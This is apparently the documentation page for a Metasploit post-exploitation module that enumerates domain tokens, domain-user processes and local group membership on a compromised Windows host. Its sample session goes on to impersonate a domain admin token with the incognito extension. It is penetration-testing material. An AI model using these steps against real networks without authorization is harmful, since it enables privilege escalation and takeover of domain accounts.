## Vulnerable Application

This module enumerates domain account tokens, processes running under
domain accounts, and domain users in the local Administrators, Users
and Backup Operator groups.


## Verification Steps

1. Start msfconsole
1. Get a Meterpreter session on a Windows target on a domain
1. Do: `use post/windows/gather/enum_domain_tokens`
1. Do: `set session [#]`
1. Do: `run`
1. You should receive a list of Active Directory domain accounts with impersonation tokens

## Options

## Scenarios

### Local Administrator session on Windows Server 2016

```
msf6 > use post/windows/gather/enum_domain_tokens
msf6 post(windows/gather/enum_domain_tokens) > set session 1
session => 1
msf6 post(windows/gather/enum_domain_tokens) > run

[*] Running module against WIN-7V3NGVNQTJ1 (192.168.200.215)
[+] Current session is running under a Local Admin account
[*] This host is not a domain controller
[*] Checking local groups for Domain Accounts and Groups

Account in Local Groups with Domain Context
===========================================

 Local Group       Member              Domain Admin
 -----------       ------              ------------
 Administrators    CORP\Domain Admins  false
 Backup Operators  CORP\asdf           false
 Users             CORP\Domain Users   false


[*] Checking for processes running under domain user

Processes under Domain Context
==============================

 Process Name  PID   Arch  User            Domain Admin
 ------------  ---   ----  ----            ------------
 cmd.exe       3504  x64   CORP\corpadmin  true
 conhost.exe   4008  x64   CORP\corpadmin  true


[*] Checking for Domain group and user tokens

Impersonation Tokens with Domain Context
========================================

 Token Type  Account Type  Account Name                                 Domain Admin
 ----------  ------------  ------------                                 ------------
 Delegation  User          CORP\corpadmin                               true
 Delegation  Group         CORP\Denied RODC Password Replication Group  false
 Delegation  Group         CORP\Domain Users                            false


[*] Post module execution completed
msf6 post(windows/gather/enum_domain_tokens) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: WIN-7V3NGVNQTJ1\Administrator
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > impersonate_token CORP\\corpadmin
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user CORP\corpadmin
meterpreter > getuid
Server username: CORP\corpadmin
meterpreter >
```
